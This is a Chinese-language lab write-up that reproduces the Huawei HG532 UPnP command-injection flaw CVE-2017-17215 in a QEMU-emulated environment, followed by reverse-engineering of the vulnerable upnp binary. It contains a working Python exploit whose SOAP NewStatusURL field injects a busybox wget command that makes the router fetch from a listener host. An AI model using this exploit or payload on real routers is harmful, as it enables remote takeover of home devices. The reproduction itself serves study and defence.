---
title: 路由器漏洞复现
date: 2021-11-06 23:45:55
tags:	
	- 固件漏洞


---

<!--more-->

# CVE-2017-17215

华为已经发了漏洞公告，固件已经升级到HG532eV100R001C02B017_upgrade_main.bin。从论坛里找到了带漏洞版本件，HG532eV100R001C02B015_upgrade_main.bin。



11月23日，Check Point的研究人员发现蜜罐中有一些可疑的安全警告。经过调查发现了攻击运行在37215端口，利用的了已经公布的华为家用路由器HG532 CVE-2017-17215漏洞。

华为网关应用了**UPnP**（通用即插即用）协议，通过TR-064及技术标准，UPnP被广泛用于家用和企业用的嵌入式设备。TR-064用于本地网络配置，比如工程师可以进行基本的设备配置，固件升级等。但是，华为使用TR-064时，通过**37215**端口暴露给了互联网。

![image-20220326115859359](https://s2.loli.net/2022/03/26/9DF8pATdG2LEvUr.png)

分析环境是ubuntu 18.04.

先用binwalk 解压一下：

![image-20210622142839951](https://s2.loli.net/2022/03/26/4omQzTvwEHhPKc6.png)

根据 Check Point 的报告，漏洞点位于 UPnP 服务中,执行下列命令，file命令看一下,可以看到upnp应该是跑在MIPS 32 位 大端架构系统

```bash
cd _HG532eV100R001C02B015_upgrade_main.bin.extracted/
cd squashfs-root/
cd bin
file upnp
```

![image-20210622143155463](https://s2.loli.net/2022/03/26/uUBVyiNn9fASh5T.png)

# 分析环境搭建

**环境搭建主要目的是搭建路由器固件运行的环境**

修改 ubuntu主机网络配置，将ubuntu主机系统中的网络接口配置文件 /etc/network/interfaces 修改为如下内容：

![image-20210622154246727](https://gitee.com/Rudesa/image/raw/master/img/20210622154246.png)

创建QEMU的网络接口启动脚本（/etc/qemu-ifup）并保存为如下内容：

```
echo "Exeuting /etc/qemu-ifup"
echo "Bringggging $1 for bridged mode..."
sudo /sbin/ifconfig $1 0.0.0.0 promisc up
echo "Adding $1 to br0..."
sudo /sbin/brtcl addif br0 $1
sleep 3
```

![image-20210622154302529](https://s2.loli.net/2022/03/26/iFeog74ULJ1Kt6n.png)

给qemu文件赋予权力

```
sudo chmod a+x /etc/qemu-ifup
```

![](https://s2.loli.net/2022/03/26/iFeog74ULJ1Kt6n.png)

重启网络使所有的配置生效

```
sudo /etc/init.d/networking  restart
```

![image-20211219214624214](https://s2.loli.net/2022/03/26/VdXylxSP6rAfs4c.png)

## qemu虚拟机

### 1. 安装qemu

在ubantu中执行下列指令

```bash
sudo apt-get install qemu 
sudo apt-get install qemu-user-static
sudo apt-get install qemu-system
```

### 2. 网络配置

1. 安装网络配置工具

```bash
apt-get install bridge-utils uml-utilities
```

​	2.修改ubuntu网络配置接口文件 **/etc/network/interfaces/**

![image-20220326120020938](https://s2.loli.net/2022/03/26/zQytFBHqlDruPTj.png)

​	3.修改qemu的网络接口启动文件脚本**etc/qemu-ifup**如下所示：

![image-20220326120037242](https://s2.loli.net/2022/03/26/y7SpD4CKrNnaMck.png)

​	4.

1. 启动桥接网络
    赋予可执行权限

```bash
sudo chmod a+x /etc/qemu-ifup 
```

重启网络服务，使配置生效

```bash
sudo /etc/init.d/networking restart
```

关闭ens33，启动桥接网络br0

```bash
sudo ifdown eth0
sudo ifup br0
```

​	执行到这里时，系统提示eh0并未启动。这里并不影响

![image-20220326120058704](https://s2.loli.net/2022/03/26/aQLUNJZRMEwK1y6.png)
 br0启动后如下所示

![image-20220326120115040](https://s2.loli.net/2022/03/26/s7egzHvQF1dLqD9.png)

### 3. 加载debian镜像文件

结合Freebuf上的教程，下载debian mips qemu镜像文件，作为固件运行环境，下载地址如下：
 https://people.debian.org/~aurel32/qemu/mips/

![image-20220326120135536](https://s2.loli.net/2022/03/26/HAKw246BF1pQDlS.png)

根据教程下载debian_squeeze_mips_standard.qcow2和vmlinux-2.6.32-5-4kc-malta。教程中作者吐槽其他的帖子有各种下载镜像的地址，但是坑很多。

然后在下载文件夹路径下，启动qemu，运行刚刚下载的镜像文件：

```
sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic,macaddr=00:16:3e:00:00:01 -net tap
```

用root/root登录进去:

![image-20210622155304225](https://s2.loli.net/2022/03/26/YMqcjT438xQAG6b.png)

发现网络不通，ifconfig -a 看一下发现网络接口为eth1：

![image-20210630170140671](https://s2.loli.net/2022/03/26/nNcmMHPi5XKgYjb.png)

敲入指令

```
nano /etc/network/interfaces	

```

将接口文件中的eth0改为eth1，之后，再键入指令

```bash
ifup eth1
```

重启eth1,再次尝试ping www.baidu.com。此时ping通。

但是我跟着这方法并没有ping通，去网上找了另外的方法

记录：尝试过重启、重启网络、重启接口。给qemu配置新的网络192.168.188.130 （自己的ip号+1就可以，我自己的是192.168.188.129），可以实现主机和虚拟机之间互通

```
ifconfig eth0 192.168.153.2/24 up
```

为了方便在qemu上操作，可以在ubuntu上运行命令

> ##### ssh root@虚拟机ip

通过ssh通道来操作虚拟机

![image-20210630165742413](https://s2.loli.net/2022/03/26/yVldgLz6Q7wxSBv.png)

将之前解压的固件包拷贝到虚拟机中：

> scp -r ./squashfs-root root@虚拟机ip:/root/

![image-20210630165621084](https://s2.loli.net/2022/03/26/3QthrSj9qsdEk5x.png)

到这里路由器固件运行的环境就搭建完成了。

# 漏洞复现

### 1.定位漏洞点

**使用grep命令找到包含ctrlt和DeviceUpgrade_1的文件upnp以及37215端口所在文件mic**

![image-20210622162241670](https://s2.loli.net/2022/03/26/oU3rEimRjNdpYPa.png)

![](https://s2.loli.net/2022/03/26/oU3rEimRjNdpYPa.png)

### 2.运行漏洞服务

找到固件所在的位置，想直接执行下upnp这个文件，报错,缺少相应的so文件造成。

![image-20210622165522985](https://s2.loli.net/2022/03/26/87caT392xQyAEZG.png)

切换根目录到路由器文件系统中

> chroot /root/squashfs-root /bin/sh
>
> 

或者执行qemu中squashfs-root文件夹中执行

```bash
chroot . sh
```

运行upnp和mic这两个文件

![image-20210630172215377](https://s2.loli.net/2022/03/26/n4DtgoFBWLY1U6a.png)

### 3. 验证漏洞

这时测试一下路由器的37215端口，

![image-20210630172423308](https://s2.loli.net/2022/03/26/C9Vx27XUauqEbFK.png)

在ubantu上键入指令**sudo nc -vlp 80** 监听本机80端口，接下来运行exp脚本验证漏洞。

### 4 EXP 脚本

根据披露的payload，构造EXP 脚本如下：

```
import requests

headers = {
    "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
}

data = '''<?xml version="1.0" ?>
 <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
   <NewStatusURL>;/bin/busybox wget -g 192.168.188.129 -l /tmp/1;</NewStatusURL>
   <NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
  </u:Upgrade>
 </s:Body>
</s:Envelope>
'''
requests.post('http://192.168.188.130:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)

```



本地80端口监听到路由器发送的Wget包(监听的时候记得要打通mic文件)

![image-20210622204357456](https://s2.loli.net/2022/03/26/FqGlgHKSpowjTRk.png)

![image-20210705204348896](https://s2.loli.net/2022/03/26/hKLA1gRmUrqjH59.png)

说明exp中的wget命令在目标路由器执行，漏洞利用成功。

# 漏洞原理

用IDA打开固件文件中的/bin/upnp文件。根据poc，注入点在`<NewStatusURL>`以及`<NewDownloadURL>`，在字符串中找到它们

![image-20220326120534445](https://s2.loli.net/2022/03/26/jZ3IzVFw7LiRkgb.png)

双击到如下所示

![image-20220326120549577](https://s2.loli.net/2022/03/26/BXQErVmozjs1KbP.png)

选中查看字符串的交叉引用。

![image-20220326120606986](https://s2.loli.net/2022/03/26/pQCRYJBG54Ehj6u.png)

跳转到如下图所示，找到了upnp 的关键代码

![image-20220326120630019](https://s2.loli.net/2022/03/26/mPkRHdyWbzotKGT.png)

可以分析出来 其中a0 参数是会的内容是会传到system()中执行的。因此可以实现命令注入
 snprintf(a0,0x400,“upg -g -U %s -t ‘1 Firmware Upgrade Image’ -c upnp -r %s -d -”,a3)

newstatusurl这个节点值为 `<NewStatusURL>$(busybox wget -g xxxx ;xx;xx)</NewStatusURL>`

```bash
snprintf(a0,0x400,"upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d -",a3)
system(a0)
```

其中a0是被拷贝的字符串的地址，也是system调用的第一个参数，这意味着路由器会执行`system(a0)`指令，达到控制该路由器的目的。例如在本文的exp中，执行的是wget指令。

a0被赋值之后就直接用system函数执行了，中间没有进行任何过滤，导致了任意命令执行。

```
int FUN_0040749c(int param_1)
{
  int iVar1;
  char *local_418;
  char *local_414;
  char acStack1040 [1028];
 
  iVar1 = ATP_XML_GetChildNodeByName
                    (*(int *)(param_1 + 0x2c),"NewDownloadURL",(int *)0x0,&local_418);
  if (((iVar1 == 0) && (local_418 != (char *)0x0)) &&
     (iVar1 = ATP_XML_GetChildNodeByName
                        (*(int *)(param_1 + 0x2c),"NewStatusURL",(int *)0x0,&local_414), iVar1 == 0)
     ) {
    if (local_414 != (char *)0x0) {
      snprintf(acStack1040,0x400,"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b",
               local_418,local_414);
      system(acStack1040);
    }
  }
  return iVar1;
}
```



### snprintf()

```
int snprintf(char *str, size_t size, const char *format, ...)
```

 设将可变参数(...)按照 format 格式化成字符串，并将字符串复制到 str 中，size 为要写入的字符的最大数目，超过 size 会被截断。

